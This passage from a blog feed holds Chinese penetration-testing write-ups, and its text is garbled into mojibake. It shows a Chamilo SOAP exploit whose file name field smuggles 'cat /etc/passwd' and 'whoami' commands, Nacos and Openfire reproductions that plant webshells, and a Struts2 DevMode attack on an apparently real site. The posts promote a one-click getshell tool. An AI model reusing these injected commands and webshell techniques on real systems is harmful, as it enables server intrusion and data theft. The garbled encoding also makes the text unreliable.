operator">></span>file_data<span class="token operator">&lt;</span><span class="token operator">/</span>key<span class="token operator">></span><span class="token operator">&lt;</span>value xsi<span class="token punctuation">:</span>type<span class="token operator">=</span><span class="token string double-quoted-string">"xsd:string"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>value<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>item<span class="token operator">></span><span class="token operator">&lt;</span>item<span class="token operator">></span><span class="token operator">&lt;</span>key xsi<span class="token punctuation">:</span>type<span class="token operator">=</span><span class="token string double-quoted-string">"xsd:string"</span><span class="token operator">></span>file_name<span class="token operator">&lt;</span><span class="token operator">/</span>key<span class="token operator">></span><span class="token operator">&lt;</span>value xsi<span class="token punctuation">:</span>type<span class="token operator">=</span><span class="token string double-quoted-string">"xsd:string"</span><span class="token operator">></span><span class="token string backtick-quoted-string">`&#123;&#125;`</span><span class="token operator">.</span>pptx'<span class="token operator">|</span><span class="token string double-quoted-string">" |cat /etc/passwd||a #&lt;/value>&lt;/item>&lt;item>&lt;key xsi:type="</span>xsd<span class="token punctuation">:</span><span class="token keyword type-declaration">string</span><span class="token string double-quoted-string">">service_ppt2lp_size&lt;/key>&lt;value xsi:type="</span>xsd<span class="token punctuation">:</span><span class="token keyword type-declaration">string</span>"<span class="token operator">></span><span class="token number">720</span>x540<span class="token operator">&lt;</span><span class="token operator">/</span>value<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>item<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>param0<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ns1<span class="token punctuation">:</span>wsConvertPpt<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token punctuation">:</span>Body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token punctuation">:</span>Envelope<span class="token operator">></span></code></pre><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ ¹æ®ä¸Šé¢expæˆ‘ä»¬åˆ†æä¸€ä¸‹è¿™ä¸ªæ¼æ´å½¢æˆçš„åŸå› ã€‚ä¸‹é¢ä»£ç  åˆå§‹åŒ–äº†ä¸€ä¸ªç±»SoapServer  å¹¶ä¸”è¾“å…¥äº†ã€‚æ„é€ å‡½æ•°ä¼ å…¥äº†uri å’Œæ–‡ä»¶çš„ä½ç½®ã€‚æ·»åŠ ä¸€ä¸ªå‡½æ•°wsConvertPpt å¹¶ä¸”ä½¿ç”¨handleå‡½æ•°è¿›è¡Œå¤„ç†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071034484.png" alt="æ¼æ´ä»£ç "><br>æˆ‘ä»¬çœ‹åˆ°æœ‰execå‡½æ•° ã€‚è¿™é‡Œå¯èƒ½æ˜¯æ¼æ´è§¦å‘ç‚¹æˆ‘ä»¬ç”¨ç½‘ç«™è°ƒè¯•ä¸€ä¸‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071039787.png" alt="æ¼æ´å‡½æ•°"><br>æˆ‘ä»¬ä½¿ç”¨phpinfo()å‡½æ•°å‘ç°æ²¡æœ‰ååº”æœ‰äººå°±è¯´æ˜¯æ˜¯ä¸æ˜¯ä¸æ˜¯è¿™ä¸ªå‡½æ•°ã€‚æˆ‘ä¹Ÿæƒ³ä½†æ˜¯å¦‚æœæˆ‘æŠŠè¿™ä¸ªå‡½æ•°åç§°æ”¹äº†ä»¥åä¼šæŠ¥é”™<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071042635.png" alt="æµ‹è¯•å‡½æ•°"><br>ä¿®æ”¹å‡½æ•°åç§°æŠ¥é”™ã€‚å› æ­¤ç¡®å®šè¿™ä¸ªå°±æ˜¯æ¼æ´å‡½æ•°ç‚¹ã€‚é‚£ä¸ºä»€ä¹ˆæ²¡æœ‰ä¸œè¥¿è¾“å‡ºå‘¢ã€‚å¯èƒ½æ˜¯è¿›è¡Œäº†è°ƒç”¨äº†phpå†…ç½®å‡½æ•°æ¸…é™¤è¾“å‡ºäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆè¿›è¡Œæµ‹è¯•å‘¢ã€‚æˆ‘ä»¬çœ‹åˆ°æœ‰è¿™ä¸€å¥ä»£ç  return serialize($data); é‚£ä¹ˆæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ä½¿ç”¨return æ¥è¿”å›æ•°æ®ä»£æ›¿echo  ç­‰è¾“å‡ºå‘½ä»¤<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071045972.png" alt="æŠ¥é”™"><br>æ˜ç™½å¦‚ä½•æ¥æ”¶æ•°æ®äº†æˆ‘ä»¬å°±å¯ä»¥æ„é€ expäº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071050691.png" alt="æ¥æ”¶æ•°æ®"><br>æ„é€ expå…³é”®ç‚¹ </p><pre class="language-sh" data-language="sh"><code class="language-sh">cd &#x2F;home&#x2F;yachimec&#x2F;public_html&#x2F;learn&#x2F;main&#x2F;inc&#x2F;lib&#x2F;ppt2png &amp;&amp; java  -Dfile.encoding&#x3D;UTF-8 -cp .:jodconverter-2.2.2.jar:jodconverter-cli-2.2.2.jar DokeosConverter -p 2002 -w 720 -h 540 -d oogie &quot;&#x2F;home&#x2F;yachimec&#x2F;public_html&#x2F;learn&#x2F;archive&#x2F;wsConvert&#x2F;&#96;&#123;&#125;&#96;&#x2F;&#96;&#123;&#125;&#96;.pptx&#39;|&quot; |whoami||a #&quot;  &quot;&#x2F;home&#x2F;yachimec&#x2F;public_html&#x2F;learn&#x2F;archive&#x2F;wsConvert&#x2F;&#96;&#123;&#125;&#96;-n&#x2F;&#96;&#123;&#125;&#96;.html&quot; åªè¦è¿™å¥å¯ä»¥æ‰§è¡Œé‚£ä¹ˆexpå°±æ„é€ å®Œæ¯•äº†</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071052947.png" alt="æ„é€ exp"></p><h2 id="æ„é€ expæ‹¿ä¸‹webshell"><a href="#æ„é€ expæ‹¿ä¸‹webshell" class="headerlink" title="æ„é€ expæ‹¿ä¸‹webshell"></a>æ„é€ expæ‹¿ä¸‹webshell</h2><p>æˆ‘ä»¬è‡ªå·±æ„é€ exp ä½¿ç”¨echoå’Œç®¡é“ç¬¦å’Œå…¶ä»–linuxå‘½ä»¤æ‰§è¡Œæ‹¿ä¸‹websellã€‚æ”¹åŠŸèƒ½å·²ç»é›†æˆåˆ°å·¥å…·é‡Œé¢äº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071054586.png" alt="æ‹¿ä¸‹webshell"><br>å·¥å…·ä¸€é”®getshellæ‰§è¡Œç»“æœã€‚è‡ªåŠ¨åŒ–getshellã€‚å¦å¤–æˆ‘ä»¬çœ‹åˆ°æœ€åæ˜¯åˆ é™¤ä¸´æ—¶ç›®å½•å•¥çš„è¿™ä¸ªå¯ä»¥ä½¿ç”¨æ¡ä»¶ç«äº‰ä¸€ç›´å†™æ–‡ä»¶ã€‚ä¼°è®¡å¯ä»¥å†™shellç›´æ¥ã€‚ä½†æ˜¯ä¸å¦‚rceåˆ°ä½ã€‚åœ°å€:<a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307071056216.png" alt="å·¥å…·æ‰§è¡Œ"></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nacosé›†ç¾¤Raftååºåˆ—åŒ–æ¼æ´(QVD-2023-13065)-å¤ç°</title>
      <link href="/penetrationtest/2023/07/articles/4c6ad3c1efab8e8e/"/>
      <url>/penetrationtest/2023/07/articles/4c6ad3c1efab8e8e/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´èµ·å› "><a href="#æ¼æ´èµ·å› " class="headerlink" title="æ¼æ´èµ·å› "></a>æ¼æ´èµ·å› </h2><ul><li>åœ¨Nacosé›†ç¾¤å¤„ç†éƒ¨åˆ†Jraftè¯·æ±‚æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ— é™åˆ¶ä½¿ç”¨hessianè¿›è¡Œååºåˆ—åŒ–åˆ©ç”¨ï¼Œæœ€ç»ˆå®ç°ä»£ç æ‰§è¡Œã€‚Jrafté€šä¿¡ç«¯å£é»˜è®¤7848ã€‚å…¶ä¸­å—å½±å“ç‰ˆæœ¬<br/>1.4.0 <= Nacos < 1.4.6 <br/>2.0.0 <= Nacos < 2.2.3 <br/>è¿™ä¸ªæ¼æ´çš„ç‰¹ç‚¹æ˜¯ä¸æ˜¯ç›´æ¥ä½¿ç”¨httpåè®®è§¦å‘çš„æ¼æ´ã€‚æ˜¯ç”¨tcp Jraft é€šä¿¡ã€‚ç¥å¥‡åœ¨äºé€šè¿‡è¿™ä¸ªjraft å‘é€åºåˆ—åŒ–çš„ä»£ç ã€‚ç›´æ¥æ³¨å…¥webçš„å†…å­˜é©¬ã€‚è¿™ä¸ªæ¼æ´æ¯”è¾ƒæ–°å¥‡æ‰€ä»¥æ¥å¤ç°ä¸€ä¸‹</li></ul><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><ul><li>æœ‰æ¼æ´çš„ç•Œé¢å¦‚ä¸‹å›¾:<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307061705157.png" alt="ç•Œé¢"></p><p>å­˜åœ¨Jraft å¹¶ä¸”ç‰¹å¾å¦‚ä¸‹å›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307061708448.png" alt="æ¼æ´ç‰¹å¾"></p></li></ul><h2 id="å·¥å…·å¤ç°"><a href="#å·¥å…·å¤ç°" class="headerlink" title="å·¥å…·å¤ç°"></a>å·¥å…·å¤ç°</h2><ul><li>exp:https://github.com/c0olw/NacosRce/ è¿™ä¸ªrelease å¸¦ç€å¾ˆå¤šjaråŒ…ã€‚æ‰€ä»¥æˆ‘ä»¬è‡ªå·±ç¼–è¯‘ä¸€ä¸ªä¸‹è½½åœ°å€ è§é¢‘é“</li><li>ç»“æœå¦‚ä¸‹:<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307061717273.png" alt="å®æˆ˜ç»“æœ"></li><br>brupæˆåŠŸç‰¹å¾ã€‚è¿™ä¸ªå·¥å…·ä½ å¦‚æœæ‰§è¡Œcmdå‘½ä»¤ã€‚é‚£ä¹ˆè‡ªåŠ¨ç»™ä½ æ³¨å…¥cmdå†…å­˜é©¬æˆ‘ä»¬åœ¨brupä¸Šæ‰§è¡Œä¸€ä¸‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307070955954.png" alt="brupå¤ç°æ‰§è¡Œç»“æœ"></p></ul>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-32315-openfireæƒé™ç»•è¿‡rce</title>
      <link href="/penetrationtest/2023/06/articles/4d9b7730efb1222b/"/>
      <url>/penetrationtest/2023/06/articles/4d9b7730efb1222b/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤ç°é‡åˆ°çš„é—®é¢˜"><a href="#å¤ç°é‡åˆ°çš„é—®é¢˜" class="headerlink" title="å¤ç°é‡åˆ°çš„é—®é¢˜"></a>å¤ç°é‡åˆ°çš„é—®é¢˜</h2><p>åˆ©ç”¨expæ·»åŠ ç”¨æˆ·ä»¥åç„¶åä¸Šä¼ shellåœ¨ä¸‹æ˜¾ç¤ºå‡ºæ’ä»¶åç§°ã€‚expä¸ªäººæ¨èï¼š<br><a href="https://github.com/miko550/CVE-2023-32315">https://github.com/miko550/CVE-2023-32315</a><br>ç™»é™†ä»¥åæ¥åˆ°æ¥åˆ°æ’ä»¶è¿™é‡Œ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211001134.png" alt="æ¥åˆ°æ’ä»¶è¿™é‡Œ"><br>å¾€ä¸‹æ‹‰çœ‹åˆ°<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211003080.png" alt="ä¸Šä¼ ç‚¹"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306210955127.png" alt="å¤ç°é‡åˆ°çš„é—®é¢˜"><br>è®¿é—®å‡ºç°404é¡µé¢<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306210958209.png" alt="è®¿é—®å‡ºç°"></p><h2 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h2><p>æ—¢ç„¶é‚£ä¹ˆéƒ¨ç½²ä¸è¡Œæˆ‘ä»¬æ¢ä¸€ä¸ªéƒ¨ç½²åˆ©ç”¨å…¶å®ƒçš„æ’ä»¶è¿›è¡Œã€‚æˆ‘æµ‹è¯•äº†è¿™ä¸ªé¡µé¢å…¶å®ƒæ’ä»¶ä¹Ÿä¸è¡Œå®˜æ–¹çš„ã€‚é‚£ä¹ˆåªæœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ’ä»¶æ ¼å¼ä¸å¯¹è¿™ä¸ªä¸èƒ½è§£ææ‰€ä»¥æ¢æˆå¯ä»¥è§£æçš„æ’ä»¶éƒ¨ç½²å¤ç°ã€‚é‚£æˆ‘ä»¬å¯ä»¥ä¸‹è½½ä»–æ¥çš„æ’ä»¶æºç è¿›è¡Œç¼–è¯‘ç„¶åã€‚ç›´æ¥è®¿é—®å°±è¡Œäº†ã€‚è¿™é‡Œæˆ‘ä»¬ç”¨db-accessæ’ä»¶æ¥å¤ç°ã€‚<br>æ·»åŠ shellç¼–è¯‘ç„¶åä¸Šä¼ ã€‚ä¸Šä¼ åæ¥è¿™é‡ŒæŸ¥çœ‹ç‚¹å‡»<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211005566.png" alt="ä¸Šä¼ æ’ä»¶"><br>ç„¶åè®¿é—®æˆ‘ä»¬çš„shellã€‚ç›´æ¥æ‹¿æã€‚<font color="red" size="4">ç”±äºè¿™ä¸ªæ¼æ´ç‰¹æ®Šæ€§å’Œnetçš„åŸå› æ— æ³•ç¼–å†™expã€‚åç»­ç¾¤ä¸»ä¸å¿™äº†ä¸“æ³¨ç ”ç©¶è½¯ä»¶çš„æ—¶å€™ã€‚ä¼šå¢åŠ ç¬¬ä¸‰æ–¹åº“è°ƒç”¨æ”¯æŒæ‰©å¤§è½¯ä»¶ä½¿ç”¨åŠŸèƒ½ã€‚ç›´æ¥è°ƒç”¨pythonæˆ–è€…goç­‰æ¼æ´åˆ©ç”¨ç¨‹åºã€‚ä½¿æˆ‘ä»¬çš„å·¥å…·æ›´åŠ å¼ºå¤§ã€‚å·¥å…·å’Œå·¥å…·æºä»£ç è¿˜æ²¡æœ‰å‘å¸ƒã€‚è¯·å…³æ³¨é¢‘é“å’Œgithubä¿¡æ¯æ„Ÿè°¢å¤§å®¶æ”¯æŒã€‚</font><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211008507.png" alt="æ‹¿ä¸‹shell"></p><h2 id="é‡åˆ°çš„å·¥å…·ç¼–è¯‘åçš„æ’ä»¶ä¸‹è½½"><a href="#é‡åˆ°çš„å·¥å…·ç¼–è¯‘åçš„æ’ä»¶ä¸‹è½½" class="headerlink" title="é‡åˆ°çš„å·¥å…·ç¼–è¯‘åçš„æ’ä»¶ä¸‹è½½"></a>é‡åˆ°çš„å·¥å…·ç¼–è¯‘åçš„æ’ä»¶ä¸‹è½½</h2><p><a href="https://t.me/SoftwareUpdateChannel/211">https://t.me/SoftwareUpdateChannel/211</a></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2-DevModeæ¼æ´æ¸—é€å®æˆ˜</title>
      <link href="/penetrationtest/2023/06/articles/3cce7d6763611bcc/"/>
      <url>/penetrationtest/2023/06/articles/3cce7d6763611bcc/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><ul><li>çœ‹åšå®¢çœ‹äº†è¿™ä¹ˆé•¿æ—¶é—´çš„å…„å¼Ÿä¼°è®¡æœ‰ç‚¹ç–‘æƒ‘è¿™äººã€‚è€å‘å®‰å“åˆ°åº•æ˜¯ä¼šä¸ä¼šæ¸—é€æµ‹è¯•ã€‚æˆ‘æ˜¯åœ¨å­¦ä¹ å®‰å“é€†å‘æ‰€ä»¥æ‰¾ç‚¹æ¡ˆä¾‹ç»ƒç»ƒæ‰‹ã€‚æ‰€ä»¥æˆ‘å‘çš„å®‰å“é€†å‘çš„æ¯”è¾ƒå¤šã€‚åç»­å‡†å¤‡å­¦ä¹ å†…ç½‘æ¸—é€æµ‹è¯•ã€‚æˆ‘æ˜¯æƒ³è‡ªå·±å¯ä»¥æŒæ¡ åŒ…å« æ¸—é€æµ‹è¯• ,ä»£ç å®¡è®¡,å®‰å“é€†å‘,å†…ç½‘æ¸—é€,å…æ€è¿™äº›æ‰€æœ‰çš„èƒ½åŠ›ã€‚ä¸ºä»¥åä¸ºäº†æˆ‘ä»¬çš„å·¥å…·å’Œå†…éƒ¨ç¾¤å’Œå¤§å®¶ä¸€èµ·äº¤æµã€‚æ‰€ä»¥æˆ‘åœ¨ä¸æ–­åŠªåŠ›ä¸­ã€‚</li><li>è¿™ç¯‡æ–‡ç« å¸¦å¤§å®¶æ¥çœ‹çœ‹æ¸—é€å®æˆ˜æµ‹è¯•ã€‚è¿™ä¸ªé‡åˆ°çš„å®æˆ˜æ¯”è¾ƒå°‘ã€‚ä¹‹å‰æœ‰æœ‹å‹åœ¨é¡¹ç›®ä¸­ä¹Ÿé‡åˆ°æ²¡æ€ä¹ˆæã€‚å› ä¸ºå­¦ä¹ æ¯”è¾ƒå¿™ã€‚å‰æ®µæ—¶é—´é—²æ¥æ— äº‹å¸®å¿™æäº†ä¸€ä¸ªæ¸—é€æµ‹è¯•é¡¹ç›®ã€‚åˆç¢°åˆ°è¿™ä¸ªæ¼æ´äº†ã€‚è¿™ä¸ªæ¼æ´ç¢°åˆ°çš„æ¯”è¾ƒå°‘æ‰€ä»¥å¾ˆå°‘äººå¯ä»¥æå®šã€‚åå¸è²Œä¼¼ä¹Ÿæœ‰ä¸€ç¯‡æ–‡ç« è¯´çš„æ˜¯è¿™ä¸ªæ¼æ´å¦‚ä½•åˆ©ç”¨ã€‚å¼€å§‹æ­£é¢˜å§</li></ul><h2 id="å‘ç°ç›®æ ‡"><a href="#å‘ç°ç›®æ ‡" class="headerlink" title="å‘ç°ç›®æ ‡"></a>å‘ç°ç›®æ ‡</h2><ul><li>ä½¿ç”¨ABC_123 å¤§ä½¬çš„struts2 å·¥å…·æ‰«æå‡ºStruts2-DevModeè§ä¸‹å›¾ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021416291.png" alt="å‘ç°ç›®æ ‡"></p><li>å› ä¸ºæ˜¯å·¥å…·æ‰«æå‡ºæ¥çš„æ¼æ´ä¸ç¡®å®šä»–æ˜¯å¦å­˜åœ¨æ¼æ´æ‰€ä»¥æˆ‘ä»¬ã€‚è¦æ‰‹å·¥å¯¹è¿™ä¸ªç½‘ç«™è¿›è¡Œæµ‹è¯•ã€‚ç¡®å®šæ˜¯å¦å­˜åœ¨æ¼æ´ã€‚å¦å¤–ç¡®å®šç½‘ç«™æ˜¯å¦å­˜åœ¨wafç­‰æ‰€ä»¥æˆ‘ä»¬æ„é€ payloadè¿›è¡Œæ‰‹å·¥æµ‹è¯•è§ä¸‹å›¾:æˆ‘ä»¬è¯·æ±‚æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„urlç„¶åæŠ¥é”™äº†ã€‚è¯´æ˜å¼€å¯äº†debugæ¨¡å¼</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021421494.png" alt="å¼€å¯äº†debugæ¨¡å¼"></p></ul><h2 id="ç¡®å®šæ˜¯å¦å­˜åœ¨æ¼æ´"><a href="#ç¡®å®šæ˜¯å¦å­˜åœ¨æ¼æ´" class="headerlink" title="ç¡®å®šæ˜¯å¦å­˜åœ¨æ¼æ´"></a>ç¡®å®šæ˜¯å¦å­˜åœ¨æ¼æ´</h2><ul><li>æˆ‘ä»¬ä½¿ç”¨payloadæ‰“ä¸€ä¸‹,å›æ˜¾äº†freemarkerã€‚æ‰€ä»¥æˆ‘ä»¬ç¡®å®šè¿™ä¸ª100%æ˜¯å­˜åœ¨æ¼æ´äº†</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021500117.png" alt="å­˜åœ¨æ¼æ´"></p></ul><h2 id="ç¡®å®šæ˜¯å¦å­˜åœ¨waf"><a href="#ç¡®å®šæ˜¯å¦å­˜åœ¨waf" class="headerlink" title="ç¡®å®šæ˜¯å¦å­˜åœ¨waf"></a>ç¡®å®šæ˜¯å¦å­˜åœ¨waf</h2><ul><li>ç¥­å‡ºå®½å­—èŠ‚ struts-061çš„payload æ‰“ä¸€ä¸‹,ç¡®å®šä¸å­˜åœ¨wafã€‚ä½†æ˜¯æ²¡æœ‰æ‰“æˆåŠŸã€‚å°è¯•äº†è®¸å¤šexpã€‚éƒ½è¿”å›null. ä»–ä»¬çš„expéƒ½æ˜¯åœ¨bodyé‡Œé¢è¿”å›ç»“æœã€‚é‚£ä¹ˆæ˜¯ä¸æ˜¯bodyé‡Œé¢è¿”å›çš„ä¸è¡Œå‘¢ã€‚æˆ‘ä»¬åœ¨headeré‡Œé¢è¿”å›ç»“æœè¡Œä¸è¡Œ(è¿™ä¸ªæ€è·¯æ¯”è¾ƒé‡è¦å¦‚æœæ²¡æœ‰è¿™ä¸ªè¿™ä¸ªç½‘ç«™æ‹¿ä¸ä¸‹)</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021428973.png" alt="ä¸å­˜åœ¨waf"></p></ul><h2 id="æ”¹å˜expæ€è·¯æˆåŠŸæ‰§è¡Œå‘½ä»¤"><a href="#æ”¹å˜expæ€è·¯æˆåŠŸæ‰§è¡Œå‘½ä»¤" class="headerlink" title="æ”¹å˜expæ€è·¯æˆåŠŸæ‰§è¡Œå‘½ä»¤"></a>æ”¹å˜expæ€è·¯æˆåŠŸæ‰§è¡Œå‘½ä»¤</h2><ul><li>é‚£æˆ‘ä»¬æ‰¾ä¸€ä¸ªheaderè¿”å›çš„expæ‰“ä¸€ä¸‹ã€‚ç”±äºä¹‹å‰å†™æˆ‘ä»¬çš„webframeworktools å·¥å…·çš„æ—¶å€™æˆ‘ä»¬å¯¹struts2 å·¥å…·çš„expè¿›è¡Œæ·±å…¥ç ”ç©¶ã€‚æ‰€ä»¥ç›´æ¥æ‰¾åˆ°å¯ä»¥åœ¨headeré‡Œé¢æ‰§è¡Œpayloadçš„å·¥å…·è½¬æ¢æˆæ‰§è¡Œå‘½ä»¤çš„æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚ç”±äºè¿™ä¸ªæ¯”è¾ƒéšç§˜expæˆ‘å°±æ‰“ç å¤„ç†äº†ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021458161.png" alt="æˆåŠŸæ‰§è¡Œå‘½ä»¤"></p></li></ul><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><ul><li>çœ‹åˆ°å¯ä»¥åªå‘½ä»¤ä¼°è®¡å¤§éƒ¨åˆ†çš„æ€è·¯æ˜¯åå¼¹shellã€‚ç„¶åå°±è¡Œäº†ã€‚ä½†æ˜¯æˆ‘æµ‹è¯•å¤§éƒ¨åˆ†åå¼¹shellçš„ä¸œä¸œåå¼¹shelléƒ½ä¸è¡Œã€‚æˆ‘ç”¨curl æµ‹è¯•å¯ä»¥å‡ºç½‘ã€‚ç°æœ‰é˜¶æ®µæˆ‘ä»¬ä¸èƒ½åå¼¹ã€‚åªèƒ½çœ‹çœ‹èƒ½ä¸èƒ½æ‹¿ä¸‹webshellã€‚æœ‰tomcatè¯´å¯ä»¥è§£æjspã€‚é‚£æˆ‘ä»¬èƒ½ä¸èƒ½åˆ©ç”¨wgetä¸‹è½½ç„¶ågetshellé€šè¿‡æ‰¾ç½‘ç«™ç‰¹å¾å›¾ç‰‡.cssï¼Œjsï¼Œhtmlã€‚ç­‰åç»­æœ€ç»ˆç¡®å®šäº†webè·¯å¾„ã€‚ç„¶åwgetä¸‹è½½æ‹¿åˆ°shelläº†ã€‚åæ¥æƒ³äº†ä¸€ä¸‹æˆ‘ä»¬èƒ½ä¸èƒ½ç›´æ¥ä¸Šä¼ webshellå‘¢ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021443322.png" alt="æ‹¿åˆ°webshell"></p></ul><h2 id="æ„é€ expä¸Šä¼ webshell"><a href="#æ„é€ expä¸Šä¼ webshell" class="headerlink" title="æ„é€ expä¸Šä¼ webshell"></a>æ„é€ expä¸Šä¼ webshell</h2><ul><li>æ ¹æ®å·¥å…·çš„expæ„é€ åŒ…ä¸Šä¼ webshellã€‚æ­¤expå·²ç»é›†æˆåˆ°å·¥å…·é‡Œé¢äº†è¯¦æƒ…çœ‹æ›´æ–°https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021448694.png" alt="é€šè¿‡ä¸Šä¼ æ‹¿åˆ°webshell"></p></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul><li>ä¹‹æ‰€ä»¥èƒ½æˆåŠŸgetshellå°±æ˜¯æˆ‘ä»¬æ‰“ç ´å¸¸è§„æ€è·¯ã€‚åœ¨headerå¤´éƒ¨æ˜¾ç¤ºç»“æœã€‚æˆåŠŸäº†ã€‚åç»­å†…ç½‘æ¸—é€ä»€ä¹ˆçš„ã€‚ç­‰æˆ‘ç ”ç©¶äº†åç»­æœ‰æˆ‘è‡ªå·±å®æˆ˜æ¸—é€å†…ç½‘çš„ä¸œä¸œæˆ–è€…æ˜¯é¶åœºä»€ä¹ˆçš„åªè¦æˆ‘è§‰å¾—è¿™ä¸ªä¸é”™æˆ‘ä¼šå†™æ–‡ç« ã€‚å…±äº«çš„ã€‚ä¸ç®¡æ˜¯æ¸—é€è¯æ˜¯ä»€ä¹ˆæˆ‘ä»¬ä¸€å®šä¸èƒ½æŒ‰ç…§å¸¸è§„æ€è·¯è¿›è¡Œæµ‹è¯•ã€‚å› ä¸ºå¸¸è§„æµ‹è¯•çš„è·¯å­å·²ç»è¢«åˆ«äººçŸ¥é“äº†å µæ­»äº†ã€‚è‡³äºå¦‚ä½•ç»ƒä¹ è‡ªå·±çš„æ¸—é€æ€ç»´ã€‚å¤šç»ƒä¹ ã€‚åŠ è‡ªå·±çš„æ€»ç»“ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŸappvpnä»£ç†æ£€æµ‹ç»•è¿‡ç®—æ³•å®šä½</title>
      <link href="/androidreverse/2023/06/articles/9d4835eb0ff8f92b/"/>
      <url>/androidreverse/2023/06/articles/9d4835eb0ff8f92b/</url>
      
        <content type="html"><![CDATA[<h2 id="å®‰å“è·å–VPNä»£ç "><a href="#å®‰å“è·å–VPNä»£ç " class="headerlink" title="å®‰å“è·å–VPNä»£ç "></a>å®‰å“è·å–VPNä»£ç </h2><ul></li>å®‰å“vpnæ£€æµ‹ä»£ç :</li><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">NetworkInterface</span><span class="token punctuation">></span></span> networkInterfaces <span class="token operator">=</span> <span class="token class-name">NetworkInterface</span><span class="token punctuation">.</span><span class="token function">getNetworkInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>networkInterfaces<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 